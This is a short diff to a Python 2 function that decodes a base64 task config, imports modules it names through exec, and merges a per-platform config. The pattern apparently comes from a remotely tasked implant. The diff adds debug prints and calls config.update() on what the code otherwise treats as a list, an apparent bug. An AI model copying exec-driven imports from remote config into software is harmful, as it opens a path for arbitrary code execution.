@@ -54,13 +54,16 @@ def get_process_config():
     global configured
     config_json = get_file_contents(process_config)
     config = json.loads(base64.b64decode(config_json))
+    configured = True
 
     for task in config:
         if task['module'] not in sys.modules:
             exec("import %s" % task['module'])
 
-    if platform.system in ["Windows", "Darwin", "Linux"]:
-        config_json = get_file_contents("%s.json" % platform.system.lower())
+    if platform.system() in ["Windows", "Darwin", "Linux"]:
+        print("%s.json" % platform.system().lower())
+        config_json = get_file_contents("%s.json" % platform.system().lower())
+        print(config_json)
         aux_config = json.loads(base64.b64decode(config_json))
 
         for task in aux_config:
@@ -69,9 +72,9 @@ def get_process_config():
 
         config.update(aux_config)
     else:
-        print "[*] Unknown platform %s" % platform.system
+        print "[*] Unknown platform %s" % platform.system()
 
-    configured = True
+    
     return config
 
 
